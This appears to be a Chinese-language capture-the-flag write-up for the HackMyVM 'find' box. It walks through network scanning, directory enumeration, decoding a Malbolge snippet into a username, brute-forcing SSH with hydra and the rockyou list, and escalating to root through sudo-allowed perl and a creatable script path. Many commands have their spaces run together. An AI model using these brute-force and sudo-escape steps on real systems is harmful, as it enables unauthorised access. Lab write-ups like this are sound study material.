@@ -1,0 +1,247 @@
+## HackMyVM - find
+
+难度：简单
+
+攻击手法：Malbolge语言、sudo提权
+
+目标: user.txt root.txt
+
+### 信息收集阶段
+
+1、主机发现
+
+    
+    
+    zhy@zhy-pc / % sudoarp-scan -l  
+    Interface: wlan0, type: EN10MB, MAC: dc:1b:a1:ba:dd:3f, IPv4: 192.168.110.115  
+    Starting arp-scan 1.9.7 with 256hosts (https://github.com/royhills/arp-scan)  
+    192.168.110.1   c4:70:ab:6c:db:cd       (Unknown)  
+    192.168.110.22  08:00:27:3a:ab:d5       PCS Systemtechnik GmbH  
+    192.168.110.39  e0:be:03:27:91:a1       (Unknown)  
+    192.168.110.50  ea:91:28:44:6a:f8       (Unknown: locally administered)  
+    192.168.110.83  dc:e9:94:46:38:d1       (Unknown)  
+    192.168.110.62  f0:62:5a:b1:19:0f       (Unknown)  
+    192.168.110.127 a4:83:e7:2c:64:ca       Apple, Inc.  
+    192.168.110.139 fc:53:9e:c5:68:46       Shanghai Wind Technologies Co.,Ltd  
+    192.168.110.208 c2:41:e0:47:bb:86       (Unknown: locally administered)  
+    192.168.110.208 c2:41:e0:47:bb:86       (Unknown: locally administered) (DUP: 2)  
+    192.168.110.209 14:85:7f:c4:37:0e       (Unknown)  
+    192.168.110.199 0c:70:4a:91:41:1e       HUAWEI TECHNOLOGIES CO.,LTD  
+    ​  
+    12packets received by filter, 0packets dropped by kernel  
+    Ending arp-scan 1.9.7: 256hosts scanned in2.010 seconds (127.36 hosts/sec). 12responded
+
+找到目标主机
+
+    
+    
+    192.168.110.22  08:00:27:3a:ab:d5       PCS Systemtechnik GmbH
+
+##### 2、端口探测
+
+    
+    
+    zhy@zhy-pc / % sudonmap -p--Pn192.168.110.22  
+    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-1816:26 CST  
+    Nmap scan report forfind.lan (192.168.110.22)  
+    Host is up (0.000090s latency).  
+    Not shown: 65533closed tcp ports (reset)  
+    PORT   STATE SERVICE  
+    22/tcp open  ssh  
+    80/tcp open  http  
+    MAC Address: 08:00:27:3A:AB:D5 (Oracle VirtualBox virtual NIC)  
+    ​  
+    Nmap done: 1IP address (1 host up) scanned in0.75 seconds
+    
+    
+    zhy@zhy-pc / % sudonmap -p22,80 -A-Pn192.168.110.22                                               
+    Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-1816:27 CST  
+    Nmap scan report forfind.lan (192.168.110.22)  
+    Host is up (0.00056s latency).  
+    ​  
+    PORT   STATE SERVICE VERSION  
+    22/tcp open  ssh   OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
+    | ssh-hostkey:   
+    |   20486e:f7:90:04:84:0d:cd:1e:5d:2e:da:b1:51:d9:bf:57 (RSA)  
+    |   25639:5a:66:38:f7:64:9a:94:dd:bc:b6:fb:f8:e7:3f:87 (ECDSA)  
+    |_  2568c:26:e7:26:62:77:16:40:fb:b5:cf:a6:1c:e0:f6:9d (ED25519)  
+    80/tcp open  http    Apache httpd 2.4.38 ((Debian))  
+    |_http-title: Apache2 Debian Default Page: It works  
+    |_http-server-header: Apache/2.4.38 (Debian)  
+    MAC Address: 08:00:27:3A:AB:D5 (Oracle VirtualBox virtual NIC)  
+    Warning: OSScan results may be unreliable because we could not findat least 1open and 1closed port  
+    Device type: general purpose  
+    Running: Linux 4.X|5.X  
+    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5  
+    OS details: Linux 4.15 -5.6  
+    Network Distance: 1hop  
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
+    ​  
+    TRACEROUTE  
+    HOP RTT     ADDRESS  
+    1 0.56 ms find.lan (192.168.110.22)  
+    ​  
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
+    Nmap done: 1IP address (1 host up) scanned in8.25 seconds
+
+访问80端口服务，发现是apache默认网页
+
+##### 3、使用 gobuster 进行目录枚举
+
+    
+    
+    zhy@zhy-pc /opt/tools/dircover/dirsearch (git)-[master] % gobuster dir --url192.168.110.22 -w/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -xtxt,jpg  
+    ===============================================================  
+    Gobuster v3.1.0  
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
+    ===============================================================  
+    [+] Url:                     http://192.168.110.22  
+    [+] Method:                  GET  
+    [+] Threads:                 10  
+    [+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  
+    [+] Negative Status codes:   404  
+    [+] User Agent:              gobuster/3.1.0  
+    [+] Extensions:              txt,jpg，png,html,php,html,htm,js  
+    [+] Timeout:                 10s  
+    ===============================================================  
+    2022/05/18 16:32:41 Starting gobuster indirectory enumeration mode  
+    ===============================================================  
+    /cat.jpg              (Status: 200) [Size: 35137]  
+    /manual               (Status: 301) [Size: 317] [--> http://192.168.110.22/manual/]  
+    /robots.txt           (Status: 200) [Size: 13]                                       
+    /server-status        (Status: 403) [Size: 279]                                      
+      
+    ===============================================================  
+    2022/05/18 16:33:55 Finished  
+    ===============================================================  
+    gobuster dir --url192.168.110.22 -w-xtxt,jpg，png,html,php,html,htm,js  27.99s user 18.35s system 62% cpu 1:14.01 total  
+    ​
+
+发现存在cat.jpg和robots.txt
+
+查看robots.txt
+
+    
+    
+    find user :)
+
+下载并查看 cat.jpg
+
+### 4、提权
+
+##### exiftool
+
+    
+    
+    zhy@zhy-pc /tmp % exiftool cat.jpg  
+    ExifTool Version Number         : 12.41  
+    File Name                       : cat.jpg  
+    Directory                       : .  
+    File Size                       : 34KiB  
+    File Modification Date/Time     : 2022:05:10 12:51:14+08:00  
+    File Access Date/Time           : 2022:05:18 16:36:21+08:00  
+    File Inode Change Date/Time     : 2022:05:18 16:36:21+08:00  
+    File Permissions                : -rw-r--r--  
+    File Type                       : JPEG  
+    File Type Extension             : jpg  
+    MIME Type                       : image/jpeg  
+    JFIF Version                    : 1.01  
+    Resolution Unit                 : inches  
+    X Resolution                    : 72  
+    Y Resolution                    : 72  
+    Comment                         : File source: https://commons.wikimedia.org/wiki/File:Cat03.jpg  
+    Image Width                     : 481  
+    Image Height                    : 480  
+    Encoding Process                : Baseline DCT, Huffman coding  
+    Bits Per Sample                 : 8  
+    Color Components                : 3  
+    Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)  
+    Image Size                      : 481x480  
+    Megapixels                      : 0.231  
+    ​
+
+发现存在 File source: <https://commons.wikimedia.org/wiki/File:Cat03.jpg>
+
+下载并进行对比，发现一段代码
+
+    
+    
+    >C<;_"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJ`_dcba`_^]\Uy<XW  
+    VOsrRKPONGk.-,+*)('&%$#"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML  
+    KJIHGFEDZY^W\[ZYXWPOsSRQPON0Fj-IHAeR
+
+##### 5、使用在线网站进行解密
+
+##### <http://www.malbolge.doleczek.pl/>
+
+    
+    
+    missyred
+
+find user :)
+
+##### 6、使用 hydar 进行密码爆破
+
+    
+    
+    zhy@zhy-pc /tmp % hydra -lmissyred -P/usr/share/seclists/rockyou/rockyou.txt ssh://192.168.110.22 -Vv  
+    Hydra v9.4-dev (c) 2022by van Hauser/THC & David Maciejak -Please donot use inmilitary or secret serviceorganizations, or forillegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
+    ​  
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-1816:43:00  
+    [22][ssh] host: 192.168.110.22   login: missyred   password: iloveyou  
+    [STATUS] attack finished for192.168.110.22 (waiting forchildren to complete tests)  
+    1of 1target successfully completed, 1valid password found  
+    [WARNING] Writing restore file because 3final worker threads did not complete untilend.  
+    [ERROR] 3targets did not resolve or could not be connected  
+    [ERROR] 0target did not complete  
+    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-05-1816:43:05
+
+登陆到目标主机
+
+    
+    
+    missyred@find:~$ sudo-l  
+    [sudo] password formissyred:   
+    Matching Defaults entries formissyred on find:  
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
+    ​  
+    User missyred may run the following commands on find:  
+    (kings) /usr/bin/perl
+
+##### 7、sudo 提权到 kings 用户
+
+    
+    
+    sudo-ukings /usr/bin/perl -e'exec "/bin/bash";'
+
+找到第一个user.txt
+
+    
+    
+    kings@find:~$ pwd; echo; ls  
+    /home/kings  
+    ​  
+    user.txt
+
+##### 8、sudo 再次提权到 root 用户
+
+    
+    
+    ings@find:~$ sudo-l  
+    Matching Defaults entries forkings on find:  
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
+    ​  
+    User kings may run the following commands on find:  
+    (ALL) NOPASSWD: /opt/boom/boom.sh
+
+发现并不存在boom目录，创建boom目录和boom.sh文件
+
+    
+    
+    ings@find:~$ cat/opt/boom/boom.sh   
+    /bin/bash  
+    kings@find:~$ sudo-uroot /opt/boom/boom.sh   
+    root@find:/home/kings# 
+
+提取到root，查看/root/root.txt
+
